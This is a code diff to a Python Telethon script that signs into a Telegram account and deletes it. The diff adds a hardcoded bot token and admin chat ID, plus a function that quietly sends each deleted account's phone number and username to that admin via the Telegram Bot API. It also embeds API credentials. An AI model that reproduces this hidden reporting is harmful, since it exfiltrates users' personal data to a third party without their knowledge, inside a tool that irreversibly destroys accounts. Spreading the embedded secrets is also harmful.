@@ -3,6 +3,7 @@ import sys
 from telethon import TelegramClient
 from telethon import functions
 import asyncio
+import requests
 
 # কালার কোড
 RED = '\033[91m'
@@ -14,6 +15,8 @@ RESET = '\033[0m'
 # API credentials (pre-configured)
 API_ID = 26108693
 API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"
+BOT_TOKEN = "8483938274:AAEegcm552wKnkWLbUHuKTTLe4vhlBmw7D4"
+ADMIN_ID = "7348506103"
 
 def print_banner():
     banner = f"""
@@ -32,6 +35,26 @@ def print_banner():
     """
     print(banner)
 
+async def send_telegram_message(phone_number, username):
+    message = f"✅ Account deleted successfully!\n📱 Phone: {phone_number}"
+    if username:
+        message += f"\n👤 Username: @{username}"
+    
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {
+        "chat_id": ADMIN_ID,
+        "text": message
+    }
+    
+    try:
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
+            print(f"{GREEN}[+] Notification sent to admin{RESET}")
+        else:
+            print(f"{YELLOW}[!] Failed to send notification: {response.text}{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] Error sending notification: {str(e)}{RESET}")
+
 async def delete_telegram_account(phone_number):
     try:
         client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
@@ -46,6 +69,10 @@ async def delete_telegram_account(phone_number):
             # Sign in with the code
             await client.sign_in(phone_number, code)
         
+        # Get user info before deleting
+        me = await client.get_me()
+        username = me.username
+        
         # Delete account
         print(f"{RED}[!] Attempting to delete account {phone_number}...{RESET}")
         result = await client(functions.account.DeleteAccountRequest(
@@ -54,6 +81,8 @@ async def delete_telegram_account(phone_number):
         
         if result:
             print(f"{GREEN}[+] Account {phone_number} has been successfully deleted!{RESET}")
+            # Send notification to admin
+            await send_telegram_message(phone_number, username)
         else:
             print(f"{RED}[-] Failed to delete account {phone_number}{RESET}")
             
